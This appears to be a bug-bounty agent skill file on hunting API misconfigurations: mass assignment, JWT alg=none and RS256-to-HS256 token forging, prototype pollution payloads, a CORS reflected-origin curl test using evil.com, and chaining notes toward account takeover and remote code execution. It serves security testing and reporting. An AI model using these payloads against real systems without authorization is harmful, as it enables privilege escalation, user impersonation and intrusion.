---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, CORS, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). CORS: wildcard with credentials, null origin, regex with subdomain takeover, postMessage origin checks. HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io), CORS preflight responses. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution, CORS bypasses."
---

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.

